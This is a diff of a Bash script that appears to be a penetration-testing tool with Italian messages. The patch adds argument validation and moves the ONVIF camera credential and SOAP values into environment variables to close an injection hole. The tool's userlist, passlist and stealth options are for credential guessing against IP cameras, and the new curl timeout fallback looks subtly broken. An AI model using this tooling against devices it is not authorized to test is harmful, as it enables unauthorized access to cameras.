     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --profile)   profile="$2";        shift 2 ;;
+            --profile)   _req_arg "$1" "${2:-}"; profile="$2";        shift 2 ;;
             --stealth)   STEALTH=1;           shift ;;
             --no-tmux)   no_tmux=1;           shift ;;
-            --timeout)   TIMEOUT="$2";        shift 2 ;;
-            --userlist)  CUSTOM_USERS="$2";   shift 2 ;;
-            --passlist)  CUSTOM_PASS="$2";    shift 2 ;;
-            --output)    OUTDIR_BASE="$2";    shift 2 ;;
+            --timeout)   _req_arg "$1" "${2:-}"; TIMEOUT="$2";        shift 2 ;;
+            --userlist)  _req_arg "$1" "${2:-}"; CUSTOM_USERS="$2";   shift 2 ;;
+            --passlist)  _req_arg "$1" "${2:-}"; CUSTOM_PASS="$2";    shift 2 ;;
+            --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";    shift 2 ;;
             --dry-run)   DRY_RUN=1;           shift ;;
             --help|-h)   usage_auto; exit 0 ;;
             -*)          err "Opzione sconosciuta: $1"; usage_auto; exit 1 ;;
@@ -8383,10 +8421,10 @@ cmd_onvif() {
     local target="" port=8000
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --port)     port="$2";        shift 2 ;;
-            --userlist) CUSTOM_USERS="$2"; shift 2 ;;
-            --passlist) CUSTOM_PASS="$2"; shift 2 ;;
-            --output)   OUTDIR_BASE="$2"; shift 2 ;;
+            --port)     _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
+            --userlist) _req_arg "$1" "${2:-}"; CUSTOM_USERS="$2"; shift 2 ;;
+            --passlist) _req_arg "$1" "${2:-}"; CUSTOM_PASS="$2"; shift 2 ;;
+            --output)   _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
             --dry-run)  DRY_RUN=1;        shift ;;
             --help|-h)  usage_onvif; exit 0 ;;
             -*)         err "Opzione sconosciuta: $1"; usage_onvif; exit 1 ;;
@@ -8428,11 +8466,12 @@ cmd_onvif() {
     # Genera un SOAP envelope con WS-UsernameToken (digest)
     _onvif_auth_envelope() {
         local user="$1" pass="$2" soap_body="$3"
-        python3 - <<PYEOF 2>/dev/null
+        ONVIF_USER="$user" ONVIF_PASS="$pass" ONVIF_SOAP_BODY="$soap_body" python3 - <<'PYEOF' 2>/dev/null
 import hashlib, base64, datetime, os, random, string
 
-user = '$user'
-pwd  = '$pass'
+user = os.environ['ONVIF_USER']
+pwd  = os.environ['ONVIF_PASS']
+soap_body = os.environ['ONVIF_SOAP_BODY']
 # Nonce casuale
 nonce_raw = ''.join(random.choices(string.ascii_letters + string.digits, k=16)).encode()
 nonce_b64  = base64.b64encode(nonce_raw).decode()
@@ -8457,7 +8496,7 @@ print(f'''<?xml version="1.0" encoding="UTF-8"?>
     </wsse:Security>
   </s:Header>
   <s:Body>
-    $soap_body
+    {soap_body}
   </s:Body>
 </s:Envelope>''')
 PYEOF
@@ -8466,7 +8505,7 @@ PYEOF
     _onvif_soap() {
         local onvif_url="$1" soap_env="$2" out_label="$3"
         local resp
-        resp=$(curl -sk --max-time 10 -X POST "$onvif_url" \
+        resp=$(curl -sk ${CURL_TIMEOUT:-10} -X POST "$onvif_url" \
                -H 'Content-Type: application/soap+xml; charset=utf-8' \
                -H 'SOAPAction: ""' \
                --data-binary "$soap_env" 2>/dev/null || true)
